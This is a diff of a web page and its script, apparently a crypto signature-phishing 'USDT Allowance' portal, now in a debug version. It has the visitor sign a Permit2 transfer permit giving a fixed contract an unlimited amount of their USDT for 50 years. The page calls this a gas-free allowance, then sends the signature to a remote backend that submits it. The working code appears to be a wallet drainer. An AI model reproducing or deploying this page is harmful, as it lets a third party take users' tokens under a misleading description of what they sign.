@@ -3,166 +3,444 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Allowance Portal</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <title>USDT Allowance - Debug</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js">
+    </script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .card { background: #1e293b; border-radius: 16px; padding: 32px; max-width: 480px; width: 100%; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }
-        h2 { font-size: 22px; text-align: center; margin-bottom: 20px; color: #38bdf8; }
-        .details { background: #0f172a; padding: 16px; border-radius: 10px; font-size: 13px; margin-bottom: 20px; border: 1px solid #334155; }
-        .details div { margin-bottom: 8px; word-break: break-all; }
-        .details div:last-child { margin-bottom: 0; }
-        .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-bottom: 12px; }
-        .btn-connect { background: #3b82f6; color: white; }
-        .btn-connect:hover { background: #2563eb; }
-        .btn-sign { background: #10b981; color: white; }
-        .btn-sign:hover { background: #059669; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .status { padding: 12px; border-radius: 8px; font-size: 13px; text-align: center; display: none; word-break: break-all; }
-        .status.info { display: block; background: #1e3a8a; color: #93c5fd; }
-        .status.success { display: block; background: #064e3b; color: #6ee7b7; }
-        .status.error { display: block; background: #7f1d1d; color: #fca5a5; }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .container{background:white;border-radius:20px;padding:40px;max-width:550px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
+        h1{color:#333;text-align:center;margin-bottom:5px;font-size:24px}
+        .subtitle{text-align:center;color:#666;margin-bottom:30px;font-size:14px}
+        .wallet-status{background:#f0f0f0;padding:12px;border-radius:10px;text-align:center;margin-bottom:20px;font-size:14px;word-break:break-all}
+        .wallet-status.connected{background:#d4edda;color:#155724}
+        .info-box{background:#f8f9fa;padding:15px;border-radius:10px;margin-bottom:20px;font-size:13px}
+        .info-box div{padding:5px 0;border-bottom:1px solid #e0e0e0}
+        .info-box div:last-child{border-bottom:none}
+        button{padding:14px 20px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;color:white;width:100%}
+        button:hover{transform:translateY(-2px);box-shadow:0 5px 20px rgba(0,0,0,0.2)}
+        button:disabled{opacity:0.5;cursor:not-allowed}
+        .btn-connect{background:#667eea}
+        .btn-sign{background:#28a745}
+        .btn-sign.signing{background:#ffc107;color:#333}
+        .btn-sign.done{background:#17a2b8}
+        .status-msg{margin-top:15px;padding:12px;border-radius:10px;display:none;text-align:center}
+        .status-msg.success{display:block;background:#d4edda;color:#155724}
+        .status-msg.error{display:block;background:#f8d7da;color:#721c24}
+        .status-msg.info{display:block;background:#d1ecf1;color:#0c5460}
+        .status-msg.loading{display:block;background:#fff3cd;color:#856404}
+        .loading{display:inline-block;width:18px;height:18px;border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin-right:10px;vertical-align:middle}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .highlight{background:#e8f4f8;padding:12px;border-radius:8px;border-left:4px solid #17a2b8;margin-bottom:15px;font-size:13px}
+        .contract-address{background:#f0f0f0;padding:8px 12px;border-radius:6px;font-size:12px;word-break:break-all;text-align:center;margin:10px 0}
+        .api-url-input{width:100%;padding:10px;border:2px solid #e0e0e0;border-radius:8px;font-size:13px;margin-bottom:15px}
+        .debug-box{background:#2d2d2d;color:#00ff00;padding:15px;border-radius:10px;font-family:monospace;font-size:12px;margin-top:15px;max-height:200px;overflow-y:auto;display:none;white-space:pre-wrap;word-break:break-all}
+        .debug-box.show{display:block}
+        .toggle-debug{background:#6c757d;padding:8px;font-size:12px;margin-top:10px;width:auto;display:inline-block}
+        .highlight-green{background:#d4edda;padding:12px;border-radius:8px;border-left:4px solid #28a745;margin-bottom:15px;font-size:13px;color:#155724}
     </style>
 </head>
 <body>
+    <div class="container">
+        <h1>💰 USDT Allowance</h1>
+        <p class="subtitle">Debug Version - Find the Error!</p>
+        
+        <div class="contract-address">📋 Contract: 0xb69E225117d428a0b349BAB76368c68012Df1837</div>
+        
+        <div class="highlight-green">
+            ✅ <strong>Debug Mode:</strong> Check console and debug box for errors
+        </div>
 
-<div class="card">
-    <h2>USDT Permit Portal</h2>
-    
-    <div class="details">
-        <div><strong>Contract:</strong> 0xb69E225117d428a0b349BAB76368c68012Df1837</div>
-        <div><strong>Treasury:</strong> 0xB70a8100a45a28b605dbfb34d713071e21A57D28</div>
-        <div><strong>Status:</strong> <span id="userAddr">Disconnected</span></div>
+        <div id="walletStatus" class="wallet-status">⛓️ Not Connected</div>
+
+        <div class="info-box">
+            <div><strong>👤 Your Address:</strong> <span id="userDisplay">Not connected</span></div>
+            <div><strong>⏰ Allowance:</strong> <span id="allowanceDisplay">Check after connect</span></div>
+            <div><strong>📅 Valid Until:</strong> <span id="expiryDisplay">-</span></div>
+        </div>
+
+        <input type="text" id="apiUrlInput" class="api-url-input" 
+               value="https://usdt-allowance-backend.vercel.app/api/submit-signature">
+
+        <button id="connectBtn" class="btn-connect">🔗 Connect Wallet</button>
+        <br><br>
+        <button id="signBtn" class="btn-sign" disabled>✍️ Sign & Submit</button>
+
+        <button id="toggleDebug" class="toggle-debug">🔍 Show Debug</button>
+        <div id="debugBox" class="debug-box"></div>
+
+        <div id="statusMsg" class="status-msg"></div>
     </div>
 
-    <button id="connectBtn" class="btn btn-connect">🔗 Connect Wallet</button>
-    <button id="signBtn" class="btn btn-sign" disabled>✍️ Sign Allowance (Gas Free)</button>
+    <script>
+        // ============================================
+        // ⭐ DEBUG HELPER
+        // ============================================
+        const debugLogs = [];
 
-    <div id="statusBox" class="status"></div>
-</div>
-
-<script>
-    const CONFIG = {
-        contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837",
-        permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
-        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-        chainId: 1
-    };
-
-    let provider, signer, userAddress;
-
-    const connectBtn = document.getElementById('connectBtn');
-    const signBtn = document.getElementById('signBtn');
-    const statusBox = document.getElementById('statusBox');
-    const userAddr = document.getElementById('userAddr');
-
-    function setStatus(msg, type = 'info') {
-        statusBox.className = `status ${type}`;
-        statusBox.textContent = msg;
-    }
-
-    async function connectWallet() {
-        if (!window.ethereum) return setStatus('MetaMask is not installed!', 'error');
-        try {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            signer = provider.getSigner();
-            userAddress = await signer.getAddress();
-
-            const net = await provider.getNetwork();
-            if (net.chainId !== CONFIG.chainId) return setStatus('Please switch to Ethereum Mainnet!', 'error');
-
-            userAddr.textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
-            connectBtn.disabled = true;
-            connectBtn.textContent = '✅ Connected';
-            signBtn.disabled = false;
-            setStatus('Wallet connected! Ready to sign.', 'success');
-        } catch (err) {
-            setStatus(err.message, 'error');
+        function debugLog(message, data = null) {
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = `[${timestamp}] ${message}`;
+            console.log(logEntry, data || '');
+            
+            debugLogs.push(logEntry);
+            if (data) {
+                debugLogs.push(JSON.stringify(data, null, 2));
+            }
+            
+            // Update debug box
+            const debugBox = document.getElementById('debugBox');
+            debugBox.textContent = debugLogs.join('\n');
+            debugBox.scrollTop = debugBox.scrollHeight;
         }
-    }
 
-    async function signAndApprove() {
-        try {
-            signBtn.disabled = true;
-            setStatus('Fetching Nonce from Permit2...', 'info');
+        // ============================================
+        // CONFIG
+        // ============================================
+        const CONFIG = {
+            contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837",
+            permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+            usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+            chainId: 1
+        };
 
-            const permit2Contract = new ethers.Contract(
-                CONFIG.permit2Address,
-                ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
-                provider
-            );
+        debugLog('🚀 App Started');
+        debugLog('📋 Contract:', CONFIG.contractAddress);
 
-            const allowanceData = await permit2Contract.allowance(userAddress, CONFIG.usdtAddress, CONFIG.contractAddress);
-            const nonce = allowanceData.nonce;
-            const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * 50); // 50 years
+        // ============================================
+        // STATE
+        // ============================================
+        let signer, provider, userAddress;
 
-            setStatus('Please sign the message in MetaMask...', 'info');
+        // ============================================
+        // DOM
+        // ============================================
+        const $ = (id) => document.getElementById(id);
+        const walletStatus = $('walletStatus');
+        const connectBtn = $('connectBtn');
+        const signBtn = $('signBtn');
+        const statusMsg = $('statusMsg');
+        const userDisplay = $('userDisplay');
+        const allowanceDisplay = $('allowanceDisplay');
+        const expiryDisplay = $('expiryDisplay');
+        const apiUrlInput = $('apiUrlInput');
+        const debugBox = $('debugBox');
+        const toggleDebug = $('toggleDebug');
 
-            const domain = {
-                name: "Permit2",
-                version: "1",
-                chainId: CONFIG.chainId,
-                verifyingContract: CONFIG.permit2Address
-            };
+        // ============================================
+        // HELPERS
+        // ============================================
+        function showStatus(msg, type = 'info') {
+            statusMsg.className = `status-msg ${type}`;
+            statusMsg.textContent = msg;
+            statusMsg.style.display = 'block';
+            debugLog(`📢 Status: ${msg} (${type})`);
+            setTimeout(() => { statusMsg.style.display = 'none'; }, 10000);
+        }
 
-            const types = {
-                PermitTransferFrom: [
-                    { name: "permitted", type: "TokenPermissions" },
-                    { name: "spender", type: "address" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "deadline", type: "uint256" }
-                ],
-                TokenPermissions: [
-                    { name: "token", type: "address" },
-                    { name: "amount", type: "uint256" }
-                ]
-            };
+        function shortenAddress(addr) {
+            if (!addr) return '';
+            return addr.slice(0, 6) + '...' + addr.slice(-4);
+        }
 
-            const message = {
-                permitted: {
-                    token: CONFIG.usdtAddress,
-                    amount: ethers.constants.MaxUint256.toString()
-                },
-                spender: CONFIG.contractAddress,
-                nonce: nonce.toString(),
-                deadline: deadline.toString()
-            };
+        // Toggle debug box
+        toggleDebug.addEventListener('click', () => {
+            debugBox.classList.toggle('show');
+            toggleDebug.textContent = debugBox.classList.contains('show') ? '🔍 Hide Debug' : '🔍 Show Debug';
+        });
 
-            const signature = await signer._signTypedData(domain, types, message);
+        // ============================================
+        // CONNECT WALLET
+        // ============================================
+        async function connectWallet() {
+            debugLog('⏳ connectWallet() started');
+            
+            try {
+                if (!window.ethereum) {
+                    debugLog('❌ No MetaMask found');
+                    showStatus('Please install MetaMask!', 'error');
+                    return;
+                }
 
-            setStatus('Submitting signature to Vercel backend...', 'info');
+                debugLog('✅ MetaMask found');
 
-            const response = await fetch('/api/submit-signature', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                debugLog('✅ Provider created');
+
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                debugLog('👤 User Address:', userAddress);
+
+                const network = await provider.getNetwork();
+                debugLog('🌐 Network:', network);
+                
+                if (network.chainId !== CONFIG.chainId) {
+                    debugLog('❌ Wrong network', { expected: CONFIG.chainId, got: network.chainId });
+                    showStatus('Please switch to Ethereum Mainnet!', 'error');
+                    return;
+                }
+
+                debugLog('✅ Network OK');
+
+                walletStatus.className = 'wallet-status connected';
+                walletStatus.innerHTML = `🟢 Connected: ${shortenAddress(userAddress)}`;
+                connectBtn.textContent = '✅ Connected';
+                connectBtn.disabled = true;
+                signBtn.disabled = false;
+
+                userDisplay.textContent = shortenAddress(userAddress);
+
+                // Check allowance
+                await checkAllowance();
+
+                showStatus('✅ Connected!', 'success');
+                debugLog('✅ Connect complete');
+
+            } catch (error) {
+                debugLog('❌ connectWallet ERROR:', error.message);
+                console.error(error);
+                showStatus(`Error: ${error.message}`, 'error');
+            }
+        }
+
+        // ============================================
+        // CHECK ALLOWANCE
+        // ============================================
+        async function checkAllowance() {
+            debugLog('⏳ checkAllowance() started');
+            
+            try {
+                if (!userAddress) {
+                    debugLog('⚠️ No user address');
+                    allowanceDisplay.textContent = 'Connect wallet first';
+                    return;
+                }
+
+                debugLog('👤 Checking for:', userAddress);
+
+                const contract = new ethers.Contract(CONFIG.contractAddress, [
+                    "function getAllowance(address user) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"
+                ], provider);
+
+                debugLog('📋 Contract created');
+
+                const result = await contract.getAllowance(userAddress);
+                debugLog('📊 Allowance result:', result);
+
+                const amount = result.amount;
+                const expiration = result.expiration;
+
+                if (amount.toString() === '0') {
+                    allowanceDisplay.textContent = '❌ No allowance';
+                    expiryDisplay.textContent = '-';
+                    debugLog('ℹ️ No allowance set');
+                    return;
+                }
+
+                const isUnlimited = amount.toString() === ethers.constants.MaxUint256.toString();
+                allowanceDisplay.textContent = isUnlimited ? '♾️ UNLIMITED ✅' : amount.toString();
+                debugLog('♾️ Is Unlimited:', isUnlimited);
+
+                if (expiration > 0) {
+                    const date = new Date(expiration * 1000);
+                    expiryDisplay.textContent = date.toLocaleDateString();
+                    debugLog('📅 Expires:', date.toLocaleDateString());
+                }
+
+                if (isUnlimited && expiration > Math.floor(Date.now() / 1000)) {
+                    signBtn.textContent = '✅ Already Approved!';
+                    signBtn.className = 'btn-sign done';
+                    signBtn.disabled = true;
+                    debugLog('✅ Already approved');
+                }
+
+            } catch (error) {
+                debugLog('❌ checkAllowance ERROR:', error.message);
+                console.error(error);
+            }
+        }
+
+        // ============================================
+        // GET PERMIT2 NONCE
+        // ============================================
+        async function getPermit2Nonce() {
+            debugLog('⏳ getPermit2Nonce() started');
+            
+            try {
+                const permit2 = new ethers.Contract(CONFIG.permit2Address, [
+                    "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"
+                ], provider);
+
+                const data = await permit2.allowance(userAddress, CONFIG.usdtAddress, CONFIG.contractAddress);
+                debugLog('📝 Nonce:', data.nonce.toString());
+                return data.nonce;
+                
+            } catch (error) {
+                debugLog('❌ getPermit2Nonce ERROR:', error.message);
+                throw error;
+            }
+        }
+
+        // ============================================
+        // ⭐ SIGN & SUBMIT - Main Function
+        // ============================================
+        async function signAndSubmit() {
+            debugLog('🚀 signAndSubmit() started');
+            
+            try {
+                if (!signer || !userAddress) {
+                    debugLog('❌ Not connected');
+                    showStatus('Connect wallet first!', 'error');
+                    return;
+                }
+
+                const apiUrl = apiUrlInput.value.trim();
+                debugLog('📤 API URL:', apiUrl);
+                
+                if (!apiUrl || !apiUrl.startsWith('http')) {
+                    debugLog('❌ Invalid API URL');
+                    showStatus('Please enter a valid Backend URL!', 'error');
+                    return;
+                }
+
+                signBtn.innerHTML = '<span class="loading"></span> Signing...';
+                signBtn.className = 'btn-sign signing';
+                signBtn.disabled = true;
+
+                // Step 1: Get nonce
+                debugLog('📝 Getting nonce...');
+                const nonce = await getPermit2Nonce();
+                debugLog('✅ Nonce:', nonce.toString());
+                
+                // Step 2: Create deadline
+                const years = 50;
+                const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
+                debugLog('⏰ Deadline:', deadline, new Date(deadline * 1000).toLocaleString());
+
+                showStatus('✍️ Please sign in MetaMask... (No Gas!)', 'info');
+
+                // Step 3: Create EIP-712 message
+                debugLog('📝 Creating EIP-712 message...');
+                
+                const domain = {
+                    name: "Permit2",
+                    version: "1",
+                    chainId: CONFIG.chainId,
+                    verifyingContract: CONFIG.permit2Address
+                };
+                debugLog('📋 Domain:', domain);
+
+                const types = {
+                    PermitTransferFrom: [
+                        { name: "permitted", type: "TokenPermissions" },
+                        { name: "spender", type: "address" },
+                        { name: "nonce", type: "uint256" },
+                        { name: "deadline", type: "uint256" }
+                    ],
+                    TokenPermissions: [
+                        { name: "token", type: "address" },
+                        { name: "amount", type: "uint256" }
+                    ]
+                };
+
+                // ⭐ UNLIMITED - .toString() එක අමතක කරන්න එපා!
+                const message = {
+                    permitted: {
+                        token: CONFIG.usdtAddress,
+                        amount: ethers.constants.MaxUint256.toString()
+                    },
+                    spender: CONFIG.contractAddress,
+                    nonce: nonce,
+                    deadline: deadline
+                };
+                debugLog('📝 Message:', message);
+
+                // Step 4: Get signature (Off-Chain - Gas Free!)
+                debugLog('✍️ Requesting signature from MetaMask...');
+                const signature = await signer._signTypedData(domain, types, message);
+                debugLog('✅ Signature received!', signature.substring(0, 40) + '...');
+
+                // Step 5: Send to backend
+                const signatureData = {
                     user: userAddress,
                     nonce: nonce.toString(),
-                    deadline: deadline.toString(),
+                    deadline: deadline,
                     signature: signature
-                })
-            });
+                };
+                debugLog('📤 Sending to backend:', signatureData);
 
-            const result = await response.json();
+                showStatus('📤 Sending to backend... (Backend will pay gas)', 'loading');
 
-            if (result.success) {
-                setStatus(`✅ Success! Tx Hash: ${result.txHash}`, 'success');
-            } else {
-                setStatus(`❌ Backend Error: ${result.error}`, 'error');
+                // ⭐ Make API call
+                debugLog('🌐 Fetching:', apiUrl);
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(signatureData)
+                });
+
+                debugLog('📥 Response status:', response.status);
+                debugLog('📥 Response headers:', Object.fromEntries(response.headers));
+
+                // ⭐ Try to parse response
+                let result;
+                try {
+                    const text = await response.text();
+                    debugLog('📥 Raw response:', text.substring(0, 500) + '...');
+                    result = JSON.parse(text);
+                    debugLog('✅ JSON parsed:', result);
+                } catch (parseError) {
+                    debugLog('❌ JSON Parse Error:', parseError.message);
+                    showStatus(`Error: Backend returned HTML instead of JSON. Please check backend URL.`, 'error');
+                    signBtn.innerHTML = '✍️ Sign & Submit';
+                    signBtn.className = 'btn-sign';
+                    signBtn.disabled = false;
+                    return;
+                }
+
+                if (result.success) {
+                    debugLog('✅ Success! Tx Hash:', result.txHash);
+                    signBtn.innerHTML = '✅ Approved!';
+                    signBtn.className = 'btn-sign done';
+                    signBtn.disabled = true;
+
+                    showStatus(`✅ ${result.message}`, 'success');
+                    console.log("🔗 https://etherscan.io/tx/" + result.txHash);
+                    await checkAllowance();
+
+                } else {
+                    debugLog('❌ Backend error:', result.error);
+                    showStatus(`❌ Error: ${result.error}`, 'error');
+                    signBtn.innerHTML = '✍️ Sign & Submit';
+                    signBtn.className = 'btn-sign';
+                    signBtn.disabled = false;
+                }
+
+            } catch (error) {
+                debugLog('❌ signAndSubmit ERROR:', error.message);
+                console.error(error);
+                showStatus(`Error: ${error.message}`, 'error');
+                signBtn.innerHTML = '✍️ Sign & Submit';
+                signBtn.className = 'btn-sign';
                 signBtn.disabled = false;
             }
-
-        } catch (err) {
-            setStatus(`Error: ${err.message}`, 'error');
-            signBtn.disabled = false;
         }
-    }
 
-    connectBtn.addEventListener('click', connectWallet);
-    signBtn.addEventListener('click', signAndApprove);
-</script>
+        // ============================================
+        // EVENT LISTENERS
+        // ============================================
+        connectBtn.addEventListener('click', connectWallet);
+        signBtn.addEventListener('click', signAndSubmit);
 
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', () => location.reload());
+            window.ethereum.on('chainChanged', () => location.reload());
+        }
+
+        debugLog('✅ App ready!');
+        console.log('🚀 USDT Allowance - Debug Mode');
+        console.log('📋 Contract:', CONFIG.contractAddress);
+    </script>
 </body>
 </html>
